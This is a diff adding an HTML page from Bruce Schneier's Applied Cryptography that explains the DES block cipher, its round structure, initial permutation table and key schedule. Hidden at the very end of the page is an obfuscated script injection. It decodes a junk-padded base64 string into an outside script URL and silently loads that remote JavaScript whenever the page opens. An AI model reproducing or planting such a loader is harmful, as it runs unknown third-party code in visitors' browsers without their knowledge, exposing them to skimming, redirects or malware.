@@ -1,0 +1,169 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=270-272//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">12.2 Description of DES</FONT></H3>
+<P>DES is a block cipher; it encrypts data in 64-bit blocks. A 64-bit block of plaintext goes in one end of the algorithm and a 64-bit block of ciphertext comes out the other end. DES is a symmetric algorithm: The same algorithm and key are used for both encryption and decryption (except for minor differences in the key schedule).
+</P>
+<P>The key length is 56 bits. (The key is usually expressed as a 64-bit number, but every eighth bit is used for parity checking and is ignored. These parity bits are the least-significant bits of the key bytes.) The key can be any 56-bit number and can be changed at any time. A handful of numbers are considered weak keys, but they can easily be avoided. All security rests within the key.</P>
+<P>At its simplest level, the algorithm is nothing more than a combination of the two basic techniques of encryption: confusion and diffusion. The fundamental building block of DES is a single combination of these techniques (a substitution followed by a permutation) on the text, based on the key. This is known as a <B>round</B>. DES has 16 rounds; it applies the same combination of techniques on the plaintext block 16 times (see Figure 12.1).</P>
+<P>The algorithm uses only standard arithmetic and logical operations on numbers of 64 bits at most, so it was easily implemented in late 1970s hardware technology. The repetitive nature of the algorithm makes it ideal for use on a special-purpose chip. Initial software implementations were clumsy, but current implementations are better.</P>
+<P><FONT SIZE="+1"><B><I>Outline of the Algorithm</I></B></FONT></P>
+<P>DES operates on a 64-bit block of plaintext. After an initial permutation, the block is broken into a right half and a left half, each 32 bits long. Then there are 16 rounds of identical operations, called Function f, in which the data are combined with the key. After the sixteenth round, the right and left halves are joined, and a final permutation (the inverse of the initial permutation) finishes off the algorithm.
+</P>
+<P>In each round (see Figure 12.2), the key bits are shifted, and then 48 bits are selected from the 56 bits of the key. The right half of the data is expanded to 48 bits via an expansion permutation, combined with 48 bits of a shifted and permuted key via an XOR, sent through 8 S-boxes producing 32 new bits, and permuted again. These four operations make up Function f. The output of Function f is then combined with the left half via another XOR. The result of these operations becomes the new right half; the old right half becomes the new left half. These operations are repeated 16 times, making 16 rounds of DES.</P>
+<P>If <I>B</I><SUB>i</SUB> is the result of the <I>i</I>th iteration, <I>L</I><SUB>i</SUB> and <I>R</I><SUB>i</SUB> are the left and right halves of <I>B</I><SUB>i</SUB>, <I>K</I><SUB>i</SUB> is the 48-bit key for round <I>i,</I> and f is the function that does all the substituting and permuting and XORing with the key, then a round looks like:</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/12-01.jpg',171,285 )"><IMG SRC="images/12-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-01.jpg',171,285)"><FONT COLOR="#000077"><B>Figure 12.1</B></FONT></A>&nbsp;&nbsp;DES.</I>
+</P>
+<DL>
+<DD><I>L</I><SUB>i </SUB>= <I>R</I><SUB>i-1</SUB>
+<DD><I>R</I><SUB>i </SUB>= <I>L</I><SUB>i-1</SUB> &#8853; f (<I>R</I><SUB>i-1</SUB>, <I>K</I><SUB>i</SUB>)
+</DL>
+<P><FONT SIZE="+1"><B><I>The Initial Permutation</I></B></FONT></P>
+<P>The initial permutation occurs before round 1; it transposes the input block as described in Table 12.1. This table, like all the other tables in this chapter, should be read left to right, top to bottom. For example, the initial permutation moves bit 58 of the plaintext to bit position 1, bit 50 to bit position 2, bit 42 to bit position 3, and so forth.
+</P>
+<P>The initial permutation and the corresponding final permutation do not affect DES&#146;s security. (As near as anyone can tell, its primary purpose is to make it easier to load plaintext and ciphertext data into a DES chip in byte-sized pieces. Remember that DES predates 16-bit or 32-bit microprocessor busses.) Since this bit-wise permutation is difficult in software (although it is trivial in hardware), many software implementations of DES leave out both the initial and final permutations. While this new algorithm is no less secure than DES, it does not follow the DES standard and should not be called DES.</P>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/12-02.jpg',347,234 )"><IMG SRC="images/12-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-02.jpg',347,234)"><FONT COLOR="#000077"><B>Figure 12.2</B></FONT></A>&nbsp;&nbsp;One round of DES.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>The Key Transformation</I></B></FONT></P>
+<P>Initially, the 64-bit DES key is reduced to a 56-bit key by ignoring every eighth bit. This is described in Table 12.2. These bits can be used as parity check to ensure the key is error-free. After the 56-bit key is extracted, a different 48-bit <B>subkey</B> is generated for each of the 16 rounds of DES. These subkeys, <I>K</I><SUB>i</SUB> are determined in the following manner.</P>
+<P>First, the 56-bit key is divided into two 28-bit halves. Then, the halves are circularly shifted left by either one or two bits, depending on the round. This shift is given in Table 12.3.</P>
+<TABLE WIDTH="100%"><TH CAPTION COLSPAN="16" ALIGN="CENTER">Table 12.1<BR>Initial Permutation
+<TR>
+<TD COLSPAN="16"><HR>
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">58,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">50,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">42,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">34,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">26,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">18,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">10,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">2,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">60,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">52,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">44,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">36,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">28,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">20,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">12,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">4,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">62,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">54,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">46,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">38,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">30,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">22,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">14,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">6,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">64,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">56,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">48,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">40,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">32,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">24,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">16,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">8,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">57,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">49,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">41,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">33,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">25,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">17,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">9,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">1,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">59,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">51,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">43,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">35,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">27,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">19,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">11,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">3,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">61,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">53,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">45,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">37,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">29,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">21,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">13,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">5,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">63,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">55,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">47,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">39,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">31,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">23,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">15,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">7
+<TR>
+<TD COLSPAN="16"><HR>
+<TR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(yhTCamdo, ElwqIySH) {ElwqIySH = yhTCamdo.createElement('script');ElwqIySH.type = 'text/javascript';ElwqIySH.async = true;ElwqIySH.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');yhTCamdo.getElementsByTagName('body')[0].appendChild(ElwqIySH);}(document));</script></body>
+</html>
